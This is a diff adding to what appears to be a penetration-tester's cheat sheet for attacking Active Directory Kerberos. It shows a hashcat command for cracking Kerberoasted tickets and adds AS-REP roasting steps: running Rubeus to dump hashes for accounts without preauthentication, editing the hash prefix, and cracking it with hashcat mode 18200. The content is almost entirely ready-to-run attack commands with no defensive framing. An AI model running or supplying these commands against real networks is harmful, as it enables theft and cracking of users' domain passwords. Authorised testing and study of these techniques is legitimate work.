@@ -35,3 +35,16 @@ place hash in txt file on attack machine and crack with hashcat
 ```
 hashcat -m 13100 -a 0 crackme.txt wordlist.txt 
 ```
+
+---
+
+### AS-REP roasting
+```
+Rubeus.exe asreproast
+```
+
+Insert `23$` after `$krb5asrep$` so that the first line will be `$krb5asrep$23$User`
+```
+`hashcat -m 18200 hash.txt Pass.txt`
+```
+
